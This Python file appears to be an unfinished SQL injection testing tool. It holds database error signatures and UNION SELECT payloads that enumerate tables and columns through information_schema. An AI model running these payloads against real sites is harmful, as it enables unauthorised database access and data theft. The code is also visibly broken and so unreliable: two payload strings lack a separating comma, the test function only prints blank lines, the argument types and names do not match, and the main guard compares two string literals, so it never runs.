import argparse
import json
import os

db_signature = {
    'MySQL': ["You have an error in your SQL syntax"],
    'SQLite': ["near \": syntax error"],
    'Oracle': ["ORA-00933: SQL command not properly ended"],
    'Microsoft SQL Server': ["Unclosed quatation mark after the character string"]
}

injection_methods = {
    "union": [
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--"
        "' UNION SELECT column_name,NULL FROM information_schema.columns--"
    ],
}

def test_injection(url, method, storage_file):
    result = []

    for method_name, payloads in injection_methods.items():
        print()

def parse_arguments():
    parser = argparse.ArgumentParser('Perform blind sql injection on url')
    parser.add_argument('URL', type=str, help='URL to test for injection')
    parser.add_argument('-x', type=str, default='GET',help='Request type used(GET/POST)')
    parser.add_argument('-o', type=os.path, default='data.json')
    args = parser.parse_args()
    if args.x not in ('GET','POST'):
        parser.error('Unsupported request type')
    return args

def main():
    try:
        args = parse_arguments()
        if not os.path.exists(args.o):
            with open(args.o, 'w') as f:
                json.dump([], f)
        test_injection(args.url, args.x, args.o)
    except Exception as e:
        print(f'Exception caught: {e}')

if '__name__' == '__main__':
    main()
